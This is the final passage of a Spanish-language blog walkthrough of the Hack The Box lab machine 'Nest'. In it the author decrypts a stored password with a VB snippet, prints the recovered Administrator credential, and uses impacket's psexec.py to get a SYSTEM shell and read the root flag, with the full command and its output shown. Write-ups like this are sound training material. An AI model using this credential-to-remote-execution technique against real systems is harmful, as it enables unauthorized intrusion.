<pre><code class="language-vb">Console.Write(&quot;Decrypted: &quot;+Decrypt(&quot;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&quot;, &quot;667912&quot;, &quot;1313Rf99&quot;, 3, &quot;1L1SA61493DRV53Z&quot;, 256))
Threading.Thread.Sleep(50000)
</code></pre>

<p>VB:
<img src="../../image/htb/nest/Screenshot_20200131_172742.png" alt="image" /></p>

<p>Credenciales:</p>

<pre><code>Administrator:XtH4nkS4Pl4y1nGX
</code></pre>

<h3 id="psexec">PSEXEC</h3>

<p>Utilizamos psexec.py de impacket para obtener nuestra shell y nuestra flag <strong>root.txt</strong>.</p>

<p><img src="../../image/htb/nest/Screenshot_20200131_173010.png" alt="image" /></p>

<pre><code class="language-bash">root@aoiri:~/htb/nest# /root/tools/impacket/examples/psexec.py 'Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178'
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file GHkDSZLH.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service QTBl on 10.10.10.178.....
[*] Starting service QTBl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
6594c2e[ ... ]94b878c41
C:\Windows\system32&gt;
</code></pre>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/monteverde/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Monteverde</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/resolute/">
                <span class="button__text">Hack The Box - Resolute</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
